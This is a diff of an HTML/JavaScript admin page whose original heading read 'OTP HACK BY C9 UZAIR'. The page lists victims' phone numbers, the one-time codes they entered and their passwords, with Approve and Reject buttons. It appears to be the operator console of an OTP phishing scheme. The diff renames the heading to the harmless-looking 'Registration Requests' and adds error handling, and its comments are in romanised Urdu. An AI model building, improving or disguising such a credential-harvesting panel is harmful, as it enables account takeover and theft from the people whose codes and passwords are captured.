@@ -6,10 +6,10 @@
     <title>Admin Panel - Registration Requests</title>
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f5f5f5; margin: 0; padding: 20px; }
-        .container { max-width: 1000px; /* Thori width barhayi hai */ margin: auto; background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); overflow-x: auto; }
+        .container { max-width: 1000px; margin: auto; background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); overflow-x: auto; }
         h1 { text-align: center; color: #333; }
         table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-        th, td { border: 1px solid #ddd; padding: 12px; text-align: left; white-space: nowrap; } /* nowrap taake text neeche na aye */
+        th, td { border: 1px solid #ddd; padding: 12px; text-align: left; white-space: nowrap; }
         th { background-color: #4CAF50; color: white; }
         tr:nth-child(even) { background-color: #f9f9f9; }
         .btn { padding: 8px 15px; border: none; border-radius: 5px; cursor: pointer; color: white; font-weight: bold; }
@@ -22,13 +22,14 @@
 <body>
 
     <div class="container">
-        <h1>OTP HACK BY C9 UZAIR</h1>
+        <h1>Registration Requests</h1>
         <table>
             <thead>
                 <tr>
                     <th>Phone Number</th>
                     <th>User's Entered OTP</th>
-                    <th>Password</th> <th>Status</th>
+                    <th>Password</th>
+                    <th>Status</th>
                     <th>Action</th>
                 </tr>
             </thead>
@@ -47,38 +48,58 @@
         async function fetchRequests() {
             try {
                 const response = await fetch(`${API_URL}/get-requests`);
+                
+                // Check karein ke server ne response theek bheja hai ya nahi
+                if (!response.ok) {
+                    throw new Error(`Server responded with status: ${response.status}`);
+                }
+                
                 const requests = await response.json();
                 
                 tbody.innerHTML = ''; 
 
-                if (requests.length === 0) {
-                    loadingText.innerText = "No requests found.";
-                } else {
-                    loadingText.innerText = "";
+                if (!requests || !Array.isArray(requests) || requests.length === 0) {
+                    loadingText.innerText = "No pending requests found.";
+                    return; // Function ko yahin rok dein
+                }
+                
+                loadingText.innerText = "";
+
+                // NAYA: Data ko display karne wale hissay mein error handling
+                try {
+                    requests.forEach(req => {
+                        const row = document.createElement('tr');
+                        let actionButtons = 'N/A';
+                        
+                        // Check karein ke request 'Pending Approval' mein hai ya nahi
+                        if (req.status === 'Pending Approval') {
+                            actionButtons = `
+                                <div class="actions">
+                                    <button class="btn approve" onclick="handleAction('approve', '${req.phoneNumber}')">Approve</button>
+                                    <button class="btn reject" onclick="handleAction('reject', '${req.phoneNumber}')">Reject</button>
+                                </div>
+                            `;
+                        }
+                        
+                        // Data display karein, agar koi field na ho to '...' dikhayein
+                        row.innerHTML = `
+                            <td>${req.phoneNumber || 'N/A'}</td>
+                            <td><strong>${req.userOtp || '...'}</strong></td>
+                            <td><strong>${req.password || '...'}</strong></td>
+                            <td>${req.status || 'N/A'}</td>
+                            <td>${actionButtons}</td>
+                        `;
+                        tbody.appendChild(row);
+                    });
+                } catch (renderError) {
+                    // Agar data display karte waqt error aaye to screen par dikhayein
+                    loadingText.innerText = `Error rendering data: ${renderError.message}`;
                 }
 
-                requests.forEach(req => {
-                    const row = document.createElement('tr');
-                    let actionButtons = 'N/A';
-                    if (req.status === 'Pending Approval') {
-                        actionButtons = `
-                            <div class="actions">
-                                <button class="btn approve" onclick="handleAction('approve', '${req.phoneNumber}')">Approve</button>
-                                <button class="btn reject" onclick="handleAction('reject', '${req.phoneNumber}')">Reject</button>
-                            </div>
-                        `;
-                    }
-                    row.innerHTML = `
-                        <td>${req.phoneNumber}</td>
-                        <td><strong>${req.userOtp || '...'}</strong></td>
-                        <td><strong>${req.password || '...'}</strong></td> <td>${req.status}</td>
-                        <td>${actionButtons}</td>
-                    `;
-                    tbody.appendChild(row);
-                });
-
-            } catch (error) {
-                loadingText.innerText = "Failed to load requests.";
+            } catch (fetchError) {
+                // Agar server se connect hi na ho paaye to error screen par dikhayein
+                loadingText.innerText = `Failed to load requests. Error: ${fetchError.message}`;
+                console.error("Fetch error:", fetchError);
             }
         }
 
